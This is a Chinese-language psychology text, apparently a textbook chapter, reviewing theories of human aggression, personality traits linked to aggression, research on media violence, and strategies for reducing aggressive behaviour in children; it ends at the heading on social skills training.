攻击的本能论遭到了许多人的批评。首先是它的循环论证：为什么攻击是一种本能？因为人类表现出攻击的行为。为什么人类会表现出攻击行为？因为人有攻击本能。其次，跨文化和人类学研究表明，有些社会比其他社会更具攻击性，因此攻击性具有文化的差异。而且，目前尚无确切的神经生理学证据显示身体会产生或累积攻击能量。 尽管，Freud攻击本能理论并没有被研究攻击行为的科学家所普遍接受，但它却成为了其他理论的研究起点，其他的理论家完善攻击模型的目的就在于能给出比Freud更好的解释。他们中的绝大多数闭口不谈人类的本能和心理能量，提出一个更积极的人性观，运用更加容易观察得到的概念，因此也就更可能得到实质性的调查结果。而对于Lorenz的观点，人们认为，Lorenz没有提出任何直接证据证明人有攻击本能，而只是通过与动物的攻击行为类比来推理人的攻击行为，指责他在还没有充分科学根据时就把有关其它物种的发现，延伸到人类身上。也正如Welson 所认为的那样“……把人类描述成嗜血成性、残忍好杀的动物。这是不符合科学事实的。尽管攻击有明显的遗传性，但是……，并没有表明存在着广泛统一的攻击本能的证据”（Welson，1985）。 2、社会学习论 Bandura认为，攻击反应可经由两种方式获得。第一种也是最重要的方式就是观察学习——儿童能注意到别人的行为，并将该行为保存在记忆之中。Bandura的著名实验表明，那些在实验中看到成人的攻击行为受到奖励的儿童，随后的攻击行为显著多于那些看到成人的攻击行为受到惩罚的儿童，也多于那些没有看到成人攻击行为的儿童。进一步的研究还表明，不仅直接的观察学习可以使儿童学习到攻击行为，通过大众媒体实现的间接学习，也可以使儿童受到同样的影响。那些曾因攻击行为而得到强化的儿童，将来进行攻击的可能性也比较大。 Bandura的攻击理论的优点在于，它不仅说明了攻击是如何习得的，而且也进一步说明了攻击行为的维持和控制。攻击行为如果成为攻击者获得利益的工具，就会因能满足攻击者的目标而被维持下来，并变成习惯。也就是说，高攻击性的儿童可能已经学会攻击是一种达到其他目的的有效而且实际的手段。 与低攻击性的儿童相比，具有高攻击性的儿童具有如下特点：（1）他们对攻击的结果有正向的期望。他们相信攻击会得到奖赏（如得到玩具）；认为攻击对他们而言是很容易的，并且能够成功阻止别人的有害行为；相信攻击可以增加他们的自尊，对受害者也不会造成任何永久的伤害。（2）他们关注的是自己能否支配或控制受害者，而不太关心对别人造成的痛苦或被同伴拒绝。（3）高攻击的儿童较易结成帮派，这种帮派一般都会鼓励和强化成员以攻击的方式解决冲突，他们会变得习惯于支配别人（或企图支配别人）。 Bandura对降低和控制人类的攻击行为是非常乐观的。既然攻击习惯是一种习得反应，如果我们努力消除维持攻击行为的各种条件，就可以消除攻击行为。如我们可以教导人们以非攻击的反应应对“负面的”情绪状态如生气或挫折，也可以树立使用非攻击的方式解决问题榜样。 社会学习理论是第一个强调认知因素影响的理论，它认为攻击和其他社会行为的习得过程是一样的，都是通过观察学习和社会强化来实现。而且，社会学习理论不仅解释了我们为什么要攻击，而且解释了攻击的获得、维持和控制，并且得到了许多研究的支持。 3、社会信息加工理论 社会信息加工理论认为，事件发生时个体是否会表现出攻击行为，取决于他对事件的加工和解释。个体是带着过去的经验（即记忆储存）及某种目标（例如交朋友、避免麻烦、寻找乐趣）而进入每一个社会情境的（Dodge，1980）。当突然间有事情发生时，就必须去加以解释。Dodge(1987)的社会信息加工模型就提出，当人们处于模棱两可的情境中时，人们采取以下步骤： 第一个步骤是搜索（search），个体会从环境中收集与事件有关的资料，寻找合理线索以明确别人在做什么。在这一阶段，个体收集有关信息的能力会影响他对该事件的反应。第二个步骤是解释（interpretation），即对线索进行推论和归因，以明确他人为什么这么做。个体会将这些信息与他过去相似的经验整合，思考他在这个情境中所追求的目标，并决定他人的行动是无意还是有意的。他收集的信息和他以前对该事件的解释会影响他对眼前事件的反应。第三个步骤则是确定反应（response）并实施。个体会思索各种自身可能采取的行动，同时还会权衡各种可能反应的优缺点，选择一个他认为“最适合”当时情况的反应。 由于每个个体的过去经验并不相同，信息加工能力也不一样，对事件的反应也不一样。那些有争吵和打架记录的高攻击个体，其记忆里常常有“同伴对我有敌意”这种强烈的预期，当他们受到伤害时，他们就会去寻找符合这种预期的社会线索。研究发现，在遭受了不明确的伤害后，高攻击性的个体试图寻找隐含有潜在恐吓和敌意的线索，并倾向于将模棱两可的线索解释为敌意，同时会很少想到以其他的、非暴力的方式解决他们面临的情况。许多研究证明，个体对对方意图的知觉，比对方真正的意图更容易影响个体对对方行为的反应。也就是说，个体是否有攻击反应取决于他对情境中的社会线索的解释。 社会信息加工理论可以确切地描述攻击或非攻击个体的信息加工差异，但仍不能清楚地说明个体为什么会有攻击或非攻击性行为以及他们为什么一开始就会有不同的信息加工方式等问题。社会信息加工理论把人看作一个总是处于理性状态的人。但实际上，人们常常会在情绪的影响下，在不理智的情况下或在意识狭窄的情况下（如喝醉了酒）发动攻击，这些攻击往往是冲动性的。社会信息加工理论不能解释这些情境下的攻击。因此，社会信息加工理论不考虑情绪等因素对攻击行为的影响，对攻击行为的解释能力是有限的。 4、挫折—攻击理论 最初的挫折—攻击理论非常简单，该理论认为挫折（目标导向行为的失败）总是会产生某种攻击，因此攻击通常是由挫折引起的。按照挫折—攻击假说，学生在高考中失败了，职员在工作中因未完成任务而受到老板的批评，儿童得不到他想要的玩具，一个青年刚刚被他深爱的女人抛弃……所有这些挫折都会引起攻击反应。而那些正在攻击他人的人，一定在此前也经历过某种程度的挫折。攻击会在什么时候停止呢？他们采用了精神分析的概念解释：攻击在经过宣泄（紧张的释放）之后就会停止。受挫的学生会把书扔得老远，失恋的青年到卡拉OK厅里放开嗓子唱一晚上的伤感情歌，紧张感就会平息了，我们可以预测他们的攻击行为将不会再爆发了。 的确，在生活中我们确实可以观察到大量的这一类的情境。许多研究都发现，受挫的人比没有受挫的人行为上更具有攻击性。而且，那些有攻击倾向的人受挫时更有可能会导致攻击。但是，研究者也发现了许多受挫但没有出现攻击行为的情境。例如，害怕受罚常会使我们在受挫后不敢攻击，又或者许多人都认为非攻击的方式更能解决问题。 如前所述，最初的假设中只有部分预测受到研究的证实。因此，心理学家Berkowitz（1983）在原来的挫折—攻击假说的基础上提出了一个修订的模型。 Berkowitz认为，挫折并不一定引起攻击反应，挫折导致的只是“攻击行为的预备”而已。攻击的预备可能由几个因素引起：如生气、自尊受到威胁、先前受到他人的袭击、先前习得的攻击习惯等，都会增加一个人的攻击预备度。引发攻击反应的另一个关键因素是攻击线索。攻击线索是指任何与过去的攻击行为有联系的物体，如枪、刀、棍子等。高度攻击预备状态加上特定的攻击线索，就会引发相应的攻击行为。 此后，Berkowitz又对这一模型进行了几次修订，并提出了以下几个主要观点：第一，攻击并不一定是因为挫折和生气，任何不愉快的事件都会导致攻击，因为这些事件引起了消极的情绪体验。发生在个体身上的事件是否愉快，则取决于个体的主观知觉，即它对于个体有着什么样的意义。一个严厉的批评对于一个非常自信、有着积极自我形象的人来说，可能不会有什么影响；但是，同样的批评如果发生在一个非常自卑的、自我形象非常消极的个体身上，则会被知觉为可怕的威胁，从而对他产生破坏性的影响。在这里，我们可以明显地看到认知理论的影响。第二，攻击线索并不是攻击的必要条件。当消极的情绪反应足够强大的时候，即使没有攻击线索的存在，也会发生攻击行为。 5、兴奋—迁移理论 Zillmann提出了两个攻击行为的模型，主要关注的是生理唤醒对激起攻击行为的作用。在他的兴奋—迁移理论中，Zillmann（1983）认为，某一来源的唤醒能迁移到其他情境中去。由于唤醒来源消失后，唤醒不会立刻终止，所剩余的兴奋就成为随后表现出来的具体情绪反应的一部分。例如，邻居抱怨你的狗每天早上7点都会叫得让人心烦，如果这个时候你刚刚晨练完，这个时候遇到这件事，你的火气就会比你还没有去之前要大得多。这也就是说晨练兴奋的迁移使你对邻居的情绪反应更加强烈。兴奋—迁移理论解释了许多以唤醒为基础的攻击案例。如身体运动、暴力电影、噪音等可以引发一种兴奋状态，并将之迁移到个体所处的情境中，而情境又激起个体的攻击行为，所以说这些都可能对攻击产生“助长”的作用(Donnerstein&Wilsonm, 1976)。 在后来的认知—兴奋交互模型中，Zillmann (1988)认为，（1）对一事件的解释（认知）可能会影响到兴奋水平，而（2）兴奋水平也可能影响认知过程。模型的第一部分表明，一个人对某一事件的思考会决定是否会被唤醒：如当你认为你的邻居说你的狗是对你有帮助的，那么由晨练引起的兴奋就可能消散；而如果你觉得邻居这么说是训斥你不会养狗，那你的可能会体验到更高水平的唤醒。模型的第二部分表明,较高的唤醒水平可能干扰个体加工复杂认知信息（如抑制攻击性的行为）的能力，而较低唤醒水平不可能唤起个体的反应，所以只有中等水平的唤醒才会对降低攻击性反应的认知加工有帮助。 6、攻击的强制模型 这是一个从家庭互动的角度解释攻击行为的形成及维持的理论。其基本观点是：一个相对不熟练的父母和有着难侍候气质的儿童之间的互动会发展出攻击行为的模式，从而使得他们彼此变得越来越具有惩罚性。 强制模型（coercive model）是Patterson（1986）等人对具有反社会行为的男孩和他们的家庭进行的为期数十年的临床研究得出的结论。这里的反社会行为包括打架斗殴、抱怨、争吵等。Patterson发现，具有高攻击性的问题儿童通常是在不正常的家庭环境下长大的儿童。他们通常生活在一个家庭冲突频繁的环境，与大多数家庭成员会常常表达赞许和肯定情感的家庭不同，这样的家庭中没有人愿意先和对方说话，一旦开口，却总是在责备、威胁或激怒其他家庭成员，而不是强调事物好的一面。Patterson将这种家庭环境称为强制型家庭环境（coercive home environment），因为大部分家庭成员间的互动常常企图要阻止他人进一步激怒自己。 在这样的家庭中，问题儿童的母亲很少把社会强化或社会赞许作为控制行为的工具，经常忽略儿童的亲社会行为，会将中性事件解释为反社会行为，并以高压策略处理儿童的不良行为。这些问题儿童在家里所受到的不可抗拒的负面待遇（包括将模糊不清的事件看作是反社会倾向），使得他们常常不相信别人，并有很强的敌意归因偏差。与家长的预期相反，在强制型家庭环境下长大的儿童更抗拒惩罚：这些儿童不仅会以反高压的技巧来加以反击，而且常会违抗父母，并且不断重复那些父母想加以压抑的行为。 这种过程很可能是：开始的时候，由强制型家庭互动发展出反社会行为和不顺从。例如当孩子喝酒后，母亲训斥他：不许你再喝酒了！不幸的是，这种过于简单的、粗暴的干预反而加速了下次的喝酒行为。于是，母亲再反对。就这样，两个人便卷进了一种加速的、强迫性的互动序列。接着，这些不顺从和反社会行为，又反过来使得父母、兄弟姐妹、老师和同伴教导这些反社会的男孩相应的社会技能变得更困难。这样，便会导致他们被同伴拒绝、学业失败和低自尊。而这些后果又进一步导致其在人际交往中问题行为的增加，从而维持了其反社会的行为。 强制模型是第一个从人际之间的互动关系的角度，把儿童的家庭环境和他本身的气质特征整合起来，说明攻击的形成和维持的理论。在这里，家庭被看成一个系统，儿童攻击行为的改变不再被看成是儿童个人的问题，而是需要改变整个家庭的互动模式。 攻击性作为人格特质 攻击性(aggressivity)之所以被视为一种人格特质，是因为：第一，攻击往往以一些内部的心理变量为中介，如愤怒、敌意、易怒性等。如那些为了维护自我形象而攻击的人，更容易将他人的行为解释为威胁，于是他们就试图通过暴力来加强自我形象。第二，攻击性存在个体差异，除了程度的差异，还有对象、方式和动因等方面的差异，如有的是欺负弱小，有的是为了维护自我形象，有的则是为了转移自己所受的压力。第三，攻击行为具有情境一致性。那些具有高攻击性的人在很多不同情境中都会表现出攻击性。如认为攻击是最好的解决问题的手段的人，就会经常用攻击去解决他遇到的问题。第四，攻击行为具有一贯性。许多纵向研究都报告个体的攻击性具有跨时间的连贯性。如一项纵向研究发现，一些在8岁的时候被评定为具有攻击性的个体，在22年 后，也就是当他们30岁的时候，仍具有高攻击性，与同龄的其他人相比，他们成为罪犯的可能性更大(Huesmann et al., 1984）。 还有研究者(Olweus, 1979)也指出，具有较高攻击性的青少年在以后的生活中将可能表现出较多的反社会行为。研究者对年龄2～18岁之间的男性被试作第一次评定，接着在6个月至21年后再次评定。在该行为评定中采用了几种不同的测量方法，如直接观察、老师评语和来自同伴的报告。在这项研究中，16个不同样本的男性被试所得的结果十分一致。尽管随着两次测验时间的延长，相关系数有所下降，在最初和随后的测试得分还是有相当高的相关。当后测和前测的时间间隔少于一年时，平均相关系数大于.70，两次测试时间间隔为21年时，该系数大约为.40。对被试实际的攻击行为进行观察所得到的攻击性分数与老师评定所得的分数是一致的。 Pulkkinen和Pitkanen(1993)测量了人们在8、9岁，14岁和26岁的攻击性，由于不同的测量适合不同年龄阶段的人，所以对不同年龄阶段的人，攻击的测量方法不尽相同。对8、9岁的儿童，研究者是通过询问老师和同伴来了解他们的攻击性，而26岁的人则是自己报告他们自身的攻击行为，同时研究者还会考察他们的犯罪记录。研究者发现男性受测者的攻击行为相当稳定的。男性在8、9岁时的攻击频率预示了他们14岁甚至26岁时的被捕次数。14岁男孩攻击测量预示了26岁时其自我报告的攻击行为及当时的被捕情况，而14岁女孩的攻击测量却无法作任何的预测。尽管女性攻击行为一致性问题尚待回答，但这些结果与在不同国家和使用不同的测量方法的研究结果一致（Huesmann, Eron, Lefkowitz, &Walder, 1984）。因此，我们能得出较恰当的结论就是对于男性攻击在跨时间上是稳定的 。这种在攻击上个体差异的稳定性为攻击倾向和特质提供了支持证据。 1、神经质、精神质与攻击 除了攻击性之外，还有许多与攻击行为相关的人格变量，例如神经质、精神质等。 神经质和精神质是Eysenck运用因素分析得到的两个人格基本维度。神经质维度依据人们情绪的稳定性和调节情况而将其置于一个连续统一体的某处。在这一维度上得高分的人是情绪易变的，他们在情绪上倾向于过度反应，并且体验到一种情绪后，不易恢复常态（Eysenck & Eysenck, 1968）。这些人经常对很小的挫折和问题有很强的反应，并且要经过很长时间才能够恢复。他们更容易兴奋，生气和抑郁。而在该维度另一端的人多表现为平静、自我适应良好，不易于出现极端和不良的情绪反应。在精神质维度上得高分的人被描述为“自我中心的，攻击性的，非个人的，冷漠的，缺乏同情心的，冲动的，不考虑他人的，并且通常是不关心正义和他人福利的”（Eysenck，1982）。许多研究表明，这两个人格维度与攻击行为之间存在相关关系。 与国外有关研究的结果基本一致，国内有学者曾做过有关小学儿童欺负与人格倾向的关系研究，结果发现小学生欺负他人的发生频率与神经质水平、精神质水平之间均存在显著或极其显著的正相关（谷传华等，2003）。该研究逻辑回归分析进一步发现了精神质水平对欺负发生概率的重要预测作用。这说明，欺负者多具有较强的精神质和神经质倾向或情绪不稳定性，而精神质水平的影响可能具有跨文化的普遍性。 2、自尊、自恋与攻击 自尊（self-esteem）是个体做出自我价值判断后产生的主观感受和体验，是自我情感方面的内容。也就是说，自尊是个人通过对自身力量、重要性、品德和能力的自我评价而形成的自我价值感（Coopersmith, 1967）。自尊与攻击行为的关系一直以来都备受关注。长期以来，人们普遍认为低自尊容易导致攻击行为。研究者对此解释就是高自尊的人对自己评价常常是正面的，认为自己很优秀、有能力、受人欢迎，并相信自己能够克服缺点（Marsh, 1986）。而低自尊的人则是对自己有较多负面评价，也就会有更多的攻击行为（Gotlib& Olson，1983）。但近年来越来越多的研究者对这个结论提出了置疑。 有人(Baumeister et al., 1996）就提出了相反的观点，他们认为攻击性起因于肯定的自我概念遭到别人指责或威胁。攻击性强的人是属于高自我评价甚至自我膨胀的人。他们还指出“人们在得到与其对自身良好观点相冲突的反馈，并要接受这些不太好的观点时，他们就会变得有攻击性。也正是那些不愿降低自我评价的人才变得更具暴力倾向”（Baumeister，1996，p.8）。还有人(Egan & Perry, 1998)也研究了低自尊与欺负的关系，结果表明：自尊心较低的儿童并非总是去攻击他人，而总是容易遭受欺负。受欺负严重削弱了儿童的自尊心，降低了儿童的自我评价或自我价值感，而这种消极的自我概念又使儿童陷入了受欺负的恶性循环当中。 研究者(Kernis et al., 1989)还研究了自尊稳定性与攻击之间的关系。通过研究受测者在一个星期内每天多次报告他们的感受来测量自尊的稳定性和自尊的一般水平。同时，这些受测者也完成了关于愤怒和敌意的测量。无论人们对自身的评价是积极还是消极的，只要他们的评价没有随时间有太大的变化，那么这些人就会被认为有着相当稳定的自尊。反之，如果人们对自身的评价在时间上起了很大变化，他们就会被认为是自尊相当不稳定的人。调查者发现有着极高且不稳定自尊的人更有可能报告愤怒情绪的体验。那些在对自身积极评价上变化颇大的人极可能在自尊受威胁时感到受伤害，而愤怒也就是他们用来抵御这种挑战的策略。那些不稳定又有着极高自尊水平的人很可能体验到愤怒并作出攻击行为，来保护他们极易受伤的自尊；而那些稳定且高自尊者攻 性最低。 自尊与攻击关系的研究结论差异如此之大，原因之一可能在于测量方法的差异和弊端。有些实验仅仅测量了总体自尊（global self-esteem），把自尊划分为高和低两种水平，没有进行更细致的区分，而另一些实验则用了更详细的分类方法；各个实验测量攻击或欺负行为的问卷和对攻击的分类标准也是不同的，所以得出的结论差异很大。另外，自尊的稳定性可能也是一个重要影响因素。一些人的自尊是长时间稳定的，而另一些人的自尊则是经常波动的。具有不稳定自尊的人比较敏感并具有防卫性，这种敏感防卫性的自尊容易导致很多负性情绪，比如焦虑、失望、愤怒等（倪凤琨，2005）。 与此同时，自恋（narcissism）与攻击的关系也逐渐受到重视。有研究者(Baumeister et al., 1996）提出了自我中心被威胁（threatened egotism）学说。该学说认为有高度赞许性自我评价倾向的人（高度自恋者）如果遭到别人的非议，这种膨胀、不稳定的自我肯定很可能对别人产生威胁，甚至导致暴力事件的发生。通过自恋人格调查问卷（Narcissistic Personality Inventory）就可以了解一个人是否有自恋倾向。自恋者的自尊通常也较高，但不太稳定，而且有自我防卫性（Baumeister，1996）。有研究者(Bushman &Baumeister, 1998）将攻击分为三种类型：因受侮辱而引起的报复性攻击，转移性攻击（被侮辱却去攻击另外的人），无缘无故的攻击（被称赞而非侮辱却去攻击称赞者）。研究结果表明自恋是攻击的重要预测项，当被侮辱激惹时，自恋者更有攻击性。另有研究也证明自恋更容 导致报复性攻击(Stucke&Sporer, 2002）。 3、情绪易感性和易怒性 易怒性(irritability)是一种会对轻微的挑衅和不满有冲动或鲁莽反应的倾向，情绪易感性(emotional susceptibility)则是一种能够体验到不悦、无助、不适应和易受伤的倾向。研究者(Caprara et al., 1994)完善了对易怒性和情绪易感性的测量，并认为通过测量人们的易怒性和情绪的易感性能够了解到那些可能使个体产生攻击行为的人格特质。 无论是在易怒性量表还是情绪的易感性量表上得分高的个体常常都会把模棱两可的事情理解为某种挫折，并非常冲动地表现出攻击行为（Caprara et al., 1994）。这些研究还表明在量表上得分不同的个体在实验室研究中的表现也是各不相同的。例如，相对于一般个体，有着极高的易怒性和极强的情绪易感性的人将会给攻击的目标会以强大的震撼（Caprara et al., 1984），并且在相互攻击中也表现出高水平的情绪唤醒（Caprara et al., 1985）。 4、敌意与攻击行为 除了易怒性和情绪的易感性与人们的攻击行为密切相关，还有一种情绪对攻击行为有重要影响，那就是敌意。研究者认为，敌意是一种态度反应，而这种态度反应长期以来都涉及对于人和事的消极感受和消极评价（Buss，1961，p.12）。而这种敌意信息加工方式则是攻击者对社会互动常采用的一种信息加工方式。研究者(Dodge et al., 1987）强调高攻击人格的行为是受自身获取和解释信息的方式所支配，并指出，当人们处于模棱两可的情境中时，通常会采取以下步骤：（1）寻找合理线索以明确别人在做什么；（2）解释线索，即对线索进行推论和归因，以明确他人为什么这么做；（3）确定应该采取的措施。然而，那些有暴力倾向的人，尤其是情绪性攻击者，他们通常却是采取以下的步骤：(1)在许多不同环境中，他们都会试图寻找隐含有潜在恐吓和敌意的线索 ；(2)倾向于将模棱两可的线索解释为敌意；(3)很少会想到其他的、非暴力的方式去解决他们所面临的问题。 另有研究者(Huesmann et al., 1984)拓展了这种信息加工理论，认为对他人行为作出敌意结论的倾向可能源于一组极其普遍的敌意信念（hostile belief）。通过因素分析，研究者发现了构成这些敌意信念的因素，认为具有典型的高度敌意信念的人往往有以下特征：（1）认为自己会被他人所迫害（所以，他们常常会认为“人们对他们会有卑鄙的行为”）；（2）认为自己所处的世界极其肮脏（比如，他们认为“人们做一些骚扰他人的事仅因为他们想这样做”）；（3）认为自己比别人更强大。进一步的研究验证了这些敌意信念与归因倾向的相关性。研究者向大学生被试放映一系列事件的录像，要求他们来评定这些情境中的行为是出于有意的敌意，或是试图提供帮助，又或者是没有什么行为意图。在观看了所有的影片后，调查发现，受迫害和肮脏世界的信念都与敌 意有显著相关。人们越是将自己视作受害者，他们越是认为这个世界是肮脏的，就越可能将别人的行为归因于敌意。 5、A型性格与攻击性 正如我们所知，A型性格个体有高竞争性、事件紧迫感和敌意等特征，B型性格个体则恰好具有相反的特征。从两类个体的特征来看，A型性格个体似乎具有更高的攻击性。事实的确如此，许多实验研究结果证实了这个看法(Baron, Russell & Arms, 1985; Carver & Glass, 1978; Berman, Gladue& Taylor, 1993)。其他研究(Strube et al., 1984)还发现，A型性格个体是真正不友好的人：他们不仅为了达成特定的目标而伤害他人，还更可能参与我们上面提到的敌意性攻击——故意伤害他人。相反，与B型性格个体相比，A型性格个体更不可能参与个工具性攻击，即通过攻击获取伤害他人之外的目标，如获取物质利益或从他人处获取赞誉。 媒体暴力与攻击 我们知道，影响攻击的因素有很多，诸如文化，家庭环境，挫折，情绪唤起状态，是否喝酒，媒体暴力的影响等。关于这些因素与攻击行为的关系的研究也非常多，其中尤以媒体暴力对攻击行为的影响的研究最为充分（Carducci，1998）。因此，我们将详细地回顾一下这方面的研究。 自从电视出现后，人们目睹攻击行为的机会大大地增加了。在所有的电视节目中，约有80％的电视剧和95％的卡通片都含有不同形式的暴力镜头。曾经在有些地方，黄金时段播出的电视剧每小时平均会出现8个暴力场景，而那些供儿童观看的卡通片平均每小时竟包含22个暴力场景（Oskamp，1984）！现代社会，人们对电视越来越依赖，在电视机前呆的时间也越来越长这就会出现一个问题：？观看了这么多的暴力，会不会对观看者的攻击行为产生影响答案是肯定的观看电视暴力的确会影响到我们对攻击和暴力的感受，观念和行为（Huesmann＆Miller，1994）。更重要的是，对于那些本身就有较强的攻击性的人来说，这种影响更加显着（Bushman，1995）。 研究电视暴力对观看者攻击行为的影响的一个常用的方法是相关研究。相当多的研究结果显示，一个人观看的电视暴力越多，他的攻击行为也越多（Eron＆Huesmann，1984,1985）。其中有些研究者为克服实验研究外部效度的局限性，还通过现场研究的方法考察了媒体对攻击行为的影响（Eron，1987; Huesmann，Eron，Dubow，＆Seebauer，1987; Lefkowitz，Eron，Walder， ＆Huesmann，1997）。研究者在儿童8岁时测量了其所看电视的数量，22年后，即30岁时再次测查他们的攻击行为。结果发现，儿童期观看电视的数量和22年后攻击行为出现的可能性呈显着的正相关，犯罪行为的严重程度和所看电视的数量亦呈显着的正相关。 但是这类研究存在着一个潜在的问题，即儿童观看暴力电视节目很可能是他们本身所具有的攻击性作用的产物。有研究表明，攻击性强的个体更偏爱看暴力电视节目（Bushman，1995 ; Fenigstein，1979）。但是研究者采用统计方法控制了儿童最初的攻击性后，研究结果仍表明，观看电视节目会导致更高的攻击行为。当研究者控制了其他可能影响攻击行为的因素如周围环境中的暴力，童年期被父母忽视的不良经历，家庭收入后，仍发现了观看暴力电视节目和攻击行为间的相关（Johnson et al。，2002）。 但是，由于相关研究的局限性，我们无法判定二者之间的因果关系。于是，研究者们又设计了一些实验来做进一步的研究。一般来说，这些实验的典型做法是，在实验控制的条件下，让一些被试观看暴力电影，而让另一些被试观看非暴力的电影。随后，这些被试有机会实施攻击行为，再比较两组被试的攻击行为。这些实验研究结果都表明，无论是儿童还是成人，观看暴力电视的人比观看非暴力电视的人表现出更多的攻击行为。而且，如果有机会，那些有攻击倾向的人更有可能选择观看暴力电影（布什曼， 1995年）。 观看大量的电视暴力会使人们对随后出现的攻击和暴力行为的情感反应变得冷漠，从而也造成了人们对于攻击和暴力采取容忍的态度，无论这种攻击行为是出现在电影中还是生活中（如看一场拳击比赛或看到两个孩子在打架）（Berkowitz，1993）。这种对攻击和暴力行为的冷漠使得我们不太可能去制止发生在我们生活中的暴力事件，这无疑会纵容那些攻击者。 过多的电视暴力会影响我们对于发生在现实世界中的暴力水平的估计。例如，调查显示，比起那些不经常看电视的人（每天看2至4个小时）来说，那些经常观看（每天看4个小时或超过4个小时的电视）电视节目的青少年和成人更容易认为现实世界中存在大量的暴力，并非常害怕自己成成暴力的受害者（Gerbner et al。，1986）。经常看电视的儿童会把现实世界知觉为一个充满暴力的世界，在家里时会害怕有“坏人”入侵，出门在外又害怕受到伤害。 此外，研究者还指出，攻击性电视节目中的暴力线索表征启动了攻击性记忆（Berkowitz，1984,1986; Bushman＆Green，1990; Huesman，1986），即大众媒体中的暴力映像可以激活观众头脑中的其他暴力映像和记忆中的情感，而使得攻击行为出现的可能性增加。大量研究支持了这一说法（Carlson，Marcus-Newhall，＆Millier，1990）。研究发现，儿童在看过暴力电影后，在随后的活动中表现出了比电影中形式更多样的攻击行为（约瑟夫森，1987年）。 不仅是电视，其他的大众媒体如报纸，杂志，互联网等对于暴力的描写同样对读者产生巨大的影响。如色情文学中大量的关于性暴力的描写与渲染，会引发男性的性唤起，使其对女性的性态度产生错误的认知，从而增加了性暴力的发生概率。 当然，大众媒体的主要功能还是为我们提供大量的信息，交流，娱乐，休闲，信息社会中人们对于大众媒体的依赖也会越来越大。我们不可能把大众媒体从我们的生活中清除掉，因此，如何规避与控制过多的媒体暴力对人们的影响，是媒体的管理者，作者，编辑们必须认真对待的问题。 。暴力性的影视作品对观看者的影响无疑是存在的但到底有多大的作用，具体的影响机制是怎样的，以目前的研究来回答这些问题，仍然有以下的疑问没有得到解决： （1）忽视了观看者的个体差异和人格特质。同样的暴力性的影视节目，对于所有的人都具有同样的影响吗？既然研究结果发现对于那些本身就有很强的攻击性的人来说这种影响更加显着，那么，到底是暴力性的影视作品增加了观看者的攻击性，还是那些原本就具有攻击性的观看者更倾向于选择观看那些暴力性的影视作品？观看者观看前的情绪状态是什么样的？对研究结果有没有影响？目前的研究似乎不能回答这个问题。 （2）之所以要研究暴力性的影视作品对观看者的攻击行为的影响，其最初的起因是因为，根据观察学习的原理，观看暴力性的影视作品，会增加观看者的暴力行为。但是，一般来说，在这些暴力性的影视作品中，“好人”的暴力行为往往是不得已而为之的自卫行为，或弘扬正义的必不可少的手段，往往是点到即止，而带有敌意性的施暴者最终都会受到相应的惩罚，那么根据强化原理，这就会抑制观看者的攻击行为。这个矛盾该作何解释？也许我们必须重新审视我们对于实验条件的控制是否严密。 （3）目前的研究中，往往都是考察影视作品中单位时间内暴力场面出现的次数，次数越多就表明其暴力程度越严重，对观看者的消极影响也就越大。但实际上，有时一个逼真，残酷，具有冲击力的暴力镜头就足以对人的心理产生重大的影响了。而许多以娱乐为目的的武侠片，尽管其中不断出现暴力的镜头，但观众感受到的却是娱乐。因此，我们更应该考察这些暴力镜头之间的质的差异，才能使研究的结果更有说服力。 控制攻击行为的策略 我们已经看到，要完整地理解攻击行为，必须考虑到各种复杂的情绪，认知，生理，文化，家庭等因素。我们对于攻击行为的控制，也是围绕着这些因素来动脑筋的。同时，由于攻击行为是一个相当稳定的人格特质，我们对于攻击的控制也最好从儿童开始以下我们将探讨攻击行为的几种控制策略： 1，宣泄 当我们感到愤怒或遭遇挫折的时候，找一个适当的时机，用一些安全的，无害的方式将我们的感情表达出来，会让我们好受一些精神分析论和挫折 - 攻击假说也都相信，宣泄能减少我们的攻击行为。因为宣泄会释放我们的紧张，从而减少攻击的需要。研究表明，宣泄确实会释放我们的紧张，但这并不意味着攻击行为的减少，相反，宣泄实际上会增强攻击的倾向（Geen，1990）。为什么会这样呢？首先，宣泄可能会暂时转移我们的注意力，但是并没有消除引发攻击的条件和动机。我们都知道，打一个充气娃娃和打一个伤害过你的人的感受永远不可能相同。其次，对于那些没有生命的物体的攻击，宣泄实际上是以一种攻击代替另一种攻击，这使得宣泄常常成了真正的攻击的战前演练，因而会使人变得更加习惯于用拳头和脚来解决问题。因此，宣泄实际上 是一种经常被使用但却可能没有什么效果的一种方法。 2，不相容反应技术 。减少儿童攻击行为的一个有效的方法是不相容反应法即除了最严重的攻击行为外，对于儿童的其他攻击行为都加以忽略（因为没有满足他的“引起注意”需要），而去强化与攻击不相容的行动（如分享和合作）。研究者（Brown＆Elliot，1965）要求幼儿园的老师在学生有攻击时就转身不理会这些事件，除非有很严重的攻击发生，否则不要回头加以干涉;同时，他们对所有亲社会的行为如分享玩具或一起玩耍都加以奖励两周之内，这种处理方式真的使儿童间的身体及语言攻击事件明显降低;数周之后的追踪处理又使攻击行为有更进一步的降低。 另有研究（Slaby＆Crowley，1977）发现，仅仅是对别人说一些好话，就可使亲社会的行为增加，而攻击行为也降低了。增加与攻击不相容的反应显然能抑制敌意行为。种不处罚的方式的好处在于，它对儿童通过敌意行为而想引人注意的企图不予强化，它也不会使儿童生气或愤怒，而且它也不会让儿童看到惩罚或攻击的榜样，所以与惩罚相连的负面影响也就可以避免了。 3，暂停法 如果攻击是为了支配其他儿童或为了取得其他儿童的东西的控制权，这里不相容反应法就不太有效了。而且，如果儿童常常去严重地伤害别人，这时做父母的恐怕不能只是转过头而不加以理会的这时，我们可以用暂停法。 - 即成人以干扰或阻止儿童的攻击行为来加以“惩罚”例如我们可以把攻击者关在他的房间里，直到他有合适的行为为止。虽然这个技术会产生一些怨恨，但是由于并没有对儿童的身体加以虐待，也没有扮演攻击的榜样，而且也不会在不知不觉中强化了儿童想以不好的行为来引人注意的企图。这种方法如果同时与不相容反应技术相结合，可达到更好的效果（Parke＆Slaby，1983）。 如图4所示，非攻击的榜样示范 按照观察学习的原理，既然儿童观看过多的暴力电视会增加他们的攻击行为，那么反过来，当儿童看到榜样用非攻击的方法来解决冲突，或是学习到一些非攻击的问题解决技巧时，他们在面对自己的问题时，通常也会采用相同的解决办法。因此，可以向儿童们展示一些用非攻击性的方法来解决问题的榜样和场景，或组织儿童观察这些非攻击性榜样的影片或卡通片。 5，社会技能训练 